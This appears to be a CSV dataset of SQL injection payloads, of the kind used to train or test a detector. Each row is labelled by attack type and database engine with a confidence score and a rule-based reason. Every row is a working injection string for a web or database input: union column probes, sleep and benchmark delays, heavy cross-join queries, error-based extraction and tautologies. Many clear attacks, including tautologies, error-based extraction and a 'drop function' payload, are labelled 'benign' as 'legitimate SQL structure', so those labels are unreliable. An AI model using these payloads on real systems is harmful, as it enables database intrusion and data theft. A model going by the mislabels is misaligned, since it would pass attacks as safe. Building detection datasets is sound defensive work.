id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25688,"1"" ) as kslq where 8669 = 8669 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25689,"1"" union all select null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25690,"1' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25691,1 ) and 7533 = 7533 and ( 7175 = 7175,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25692,"1"" ) ) and 7533 = 7533 and ( ( ""gkca"" = ""gkca",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25693,"-4711%"" ) ) union all select 6737,6737,6737,6737#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25694,-7675%' ) ) ) order by 1--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25695,1'+ ( select goec where 9460 = 9460 rlike ( select ( case when ( 4740 = 1203 ) then 1 else 0x28 end ) ) ) +',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25696,1' ) where 3730 = 3730 and sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25697,"1'+ ( select iaeu where 5509 = 5509 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25698,"1'|| ( select 'bmyt' from dual where 9407 = 9407 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",time_blind,oracle,0.85,Signal match: randomblob → time_blind (P5); DB signature: oracle,1
25699,"1 ) where 8671 = 8671 and make_set ( 4931 = 1642,1642 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25700,-3596 ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 3645 = 3645,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25701,-2431' ) or 8571 = 8571--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25702,"-8599 ) ) or elt ( 5628 = 2324,2324 ) and ( ( 1134 = 1134",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25703,"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25704,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'rkoe' = 'rkoe",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25705,"1' ) as jxqt where 4322 = 4322 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25706,"-8919"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""nstr"" = ""nstr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25707,"-9136%"" ) union all select 3081,3081,3081,3081,3081,3081,3081#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25708,"1"" where 6325 = 6325 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25709,"1%"" ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25710,"1%"" and 2006 = 2006",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25711,"-2852%' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25712,"1%' ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25713,-5327' ) ) ) or 1606 = 6099,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25714,"-2518' union all select 6818,6818,6818,6818,6818,6818#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25715,"-8654' union all select 7190,7190,7190,7190,7190#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25716,"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'wgbh' = 'wgbh",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25717,-7444 ) ) ) or 1342 = 9774,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25718,"1' ) ) union all select null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25719,"1' ) as mmhe where 2142 = 2142 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25720,"-1000"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""isbq"" = ""isbq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25721,"1' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'qvrd' = 'qvrd",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25722,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25723,"1' ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 'nets' like 'nets",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25724,"1"" where 5517 = 5517 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25725,"1%"" ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25726,"1' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 'kmjn' = 'kmjn",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25727,1 ) where 3671 = 3671,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25728,"1' ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'kqqf' = 'kqqf",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25729,1' rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25730,"1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'narn' = 'narn",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25731,"1', ( select ( case when ( 3717 = 3717 ) then 1 else 3717* ( select 3717 from master..sysdatabases ) end ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25732,"1 ) where 5234 = 5234 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25733,"select * from generate_series ( 6468,6468,case when ( 6468 = 7999 ) then 1 else 0 end ) limit 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25734,"1"" where 1140 = 1140 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25735,"1 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25736,if ( 1665 = 3845 ) select 1665 else drop function nzod--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25737,"1' ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25738,"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) -- xgyc",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25739,"1%' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and '%' = '",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25740,"1 ) where 9829 = 9829 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25741,"1%' ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25742,"1%' ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25743,"-3082"" ) where 1082 = 1082 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
